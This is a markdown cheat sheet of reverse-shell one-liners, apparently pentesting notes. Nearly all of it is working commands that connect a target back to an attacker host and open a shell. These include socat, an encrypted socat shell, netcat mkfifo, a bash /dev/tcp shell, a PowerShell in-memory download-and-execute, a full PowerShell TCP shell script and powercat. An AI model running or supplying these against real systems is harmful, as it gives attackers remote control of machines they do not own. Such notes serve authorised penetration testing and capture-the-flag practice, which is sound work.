# Reverse shell

Occur when the target is forced to execute code that reconnects to your computer.

This is a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target

**NB: The disadvantage is that, when you receive a shell from a machine via the Internet, you will need to configure your own network to accept the shell.**


## Socat

Start a shell listener

```sh
socat TCP-L:4444 -
```

```sh
socat TCP:<ATTACK-IP>:<PORT> EXEC:powershell.exe,pipes
```

```sh
socat TCP:<ATTACK-IP>:<PORT> EXEC:"bash -li"
```

### Fully stable Linux TTY reverse shell

Start a listener

```sh
socat TCP-L:4444 FILE:`tty`,raw,echo=0
```

```sh
socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

### Encrypted shells

Generate a certificate to use encrypted shells

```sh
openssl req --newkey rsa:2028 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

Merge the two files into one

```sh
cat shell.key shell.crt > shell.pem
```

Start a listener with the file

```sh
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```


```sh
socat OPENSSL:<ATTACKER-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

### Common shells

Start a listener

```sh
nc -nlvp <PORT>
```

```sh
mkfifo /tmp/f; nc <ATTACK-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.113.150 9001 >/tmp/f
bash -c 'bash -i >& /dev/tcp/10.10.15.4/9001 0>&1
```


## PowerShell

Download and execute a reverse-shell in memory

```sh
powershell iex (New-Object Net.WebClient).DownloadString('http://ip:port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ATTACK-IP> -Port 443
```

Execute this in powershell

```c
$client = New-Object System.Net.Sockets.TCPClient('<ATTACK-IP>', '443');
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
	$sendback = (iex $data 2>&1 | Out-String);
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
}
$client.Close();
```

## PowerCat

It's the powershell version of netcat

```sh
. .\powercat.ps1
powercat -c <ATTACK-IP> -p 9001 -e cmd -v
```
